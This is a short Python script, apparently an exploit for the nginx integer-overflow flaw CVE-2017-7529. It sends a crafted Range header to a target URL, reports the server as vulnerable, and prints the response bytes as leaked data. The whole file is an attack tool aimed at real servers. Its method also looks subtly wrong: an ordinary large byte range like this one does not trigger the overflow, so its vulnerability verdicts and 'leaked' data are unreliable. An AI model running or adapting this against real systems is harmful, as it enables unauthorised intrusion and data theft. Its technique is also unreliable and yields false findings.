import requests
import argparse

class NginxExploit:
    def __init__(self, target_url):
        self.url = target_url
        self.headers = {"Range": "bytes=0-9223372036854775807"} 

    def check_vulnerability(self):
        try:
            response = requests.get(self.url, headers=self.headers)
            if response.status_code == 206 and "Content-Range" in response.headers:
                return True
            return False
        except requests.RequestException as e:
            print(f"Error: {e}")
            return False

    def exploit_vulnerability(self):
        """ 취약점이 발견되면 민감한 데이터 추출 """
        try:
            print("[*] Exploiting the vulnerability...")
            response = requests.get(self.url, headers=self.headers)
            if response.status_code == 206:
                data = response.content
                print(f"[+] Data leaked (first 256 bytes): {data[:256]}")
            else:
                print("[-] Failed to leak data.")
        except requests.RequestException as e:
            print(f"Error during exploitation: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit Nginx Integer Overflow Vulnerability (CVE-2017-7529)")
    parser.add_argument("url", help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument("-c", "--check", action="store_true", help="Check if the target is vulnerable.")
    args = parser.parse_args()

    exploit = NginxExploit(args.url)

    if args.check:
        if exploit.check_vulnerability():
            print(f"[+] {args.url} is vulnerable to CVE-2017-7529")
        else:
            print(f"[-] {args.url} is not vulnerable.")
    else:
        if exploit.check_vulnerability():
            exploit.exploit_vulnerability()
        else:
            print("Target is not vulnerable. Exploit aborted.")
